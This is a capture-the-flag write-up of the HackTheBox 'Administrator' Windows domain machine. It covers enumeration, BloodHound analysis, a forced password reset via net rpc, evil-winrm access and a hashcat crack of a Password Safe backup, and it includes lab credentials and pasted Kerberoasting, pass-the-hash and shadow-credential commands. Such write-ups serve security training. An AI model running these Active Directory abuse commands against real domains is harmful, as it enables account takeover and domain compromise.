---
Started: "{{DD-MM-YY}} | 14:28"
Ended: "{{DD-MM-YY}} |"
---

#CTF/HTB/Windows/Medium

# Given

`Administrator` is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

## IP

10.10.11.42

## Creds

Olivia : ichliebedich

# Writeup

## Enumeration

I started with the usual Rustscan to find out which ports could be open, and a full port scan in the background.

```shell title="nmap" fold
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 13:15:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.
htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.
htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49990/tcp open  msrpc         Microsoft Windows RPC
58537/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58542/tcp open  msrpc         Microsoft Windows RPC
58553/tcp open  msrpc         Microsoft Windows RPC
58564/tcp open  msrpc         Microsoft Windows RPC
58600/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The ports seemed to tally, so I started to look at the services running in order to note anything of interest.

```bash
- FTP(22)
- DNS(53)
- Kerberos(88)
- RPC(135)
- LDAP(389)
- SMB(445)
- HTTP(5985)
```

Also, the host seems to be called `DC` which could mean that this is the domain controller, running Windows. I'll start testing the services in order.

1. FTP
   ![](Assets/Pasted%20image%2020250714211633.png)
2. SMB
	1. Null session
	   ![](Assets/Pasted%20image%2020250714212046.png)
	2. Enum shares with the breached creds
	   ![](Assets/Pasted%20image%2020250714212137.png)
	3. Enum users with `rid-brute`
	   ![](Assets/Pasted%20image%2020250714212418.png)
	4. Found out that the domain is called `administrator.htb`
3. LDAP
	1. Checked for domain users
	   ![](Assets/Pasted%20image%2020250714213818.png)
	2. It was becoming more and more clear that I needed bloodhound to look at the connections between all these accounts and groups. So I used the LDAP protocol and bloodhound ingestor to gather more info
	   ![](Assets/Pasted%20image%2020250714214259.png)

I fed the ingestor data into Bloodhound, and started at Olivia
![](Assets/Pasted%20image%2020250714215856.png)

### Olivia -> Michael

```bash fold
Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.

Targeted Kerberoast

A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

Force Change Password

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.

Shadow Credentials

attack

To abuse this permission, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).

pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"

For other optional parameters, view the pyWhisker documentation.

```

#### Force Change Michael's Password

Used the following command to change michael's password.
`net rpc password "michael" "newpass2025" -U "ADMINISTRATOR"/"olivia"%"ichliebedich" -S 10.10.11.42`

Use `evil-winrm` to get into the user's machine
`evil-winrm -i 10.10.11.42 -u michael -p newpass2025`

![](Assets/Pasted%20image%2020250715091827.png)

### Michael -> Benjamin

```bash fold

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.

```

I used the permission michael had over benjamin's account, and changed the password. After that I tried SMB, and evil-winrm but I didn't get anything out of either. I looked at FTP which was previously inaccessible with Olivia's creds.
I managed to get my hands on a file called `Backup.psafe3`. 

I used `psafe2john` to dump the hash in the file, and then used John on it. At the same time, I ran Hashcat. 
`hashcat -m 5200 -a 0 -o backup.psafe.cracked Backup.psafe3 /usr/share/wordlists/rockyou.txt`

Hashcat finished first, with a password. Time to open the safe using that password.

The next step is to see which user the password belongs to. For that, I'll go back to nxc and do a password spray with users using the smb service. I got the user list through my earlier enumeration, and with the magic of regex, I had a user list:

```bash title:users fold 
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

### Benjamin -> Share Moderators

```bash
The user BENJAMIN@ADMINISTRATOR.HTB is a member of the group SHARE MODERATORS@ADMINISTRATOR.HTB.

Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.
```

# Creds

michael : newpass2025
benjamin : newpass2025x

Backup.psafe3 : tekieromucho 

# Proof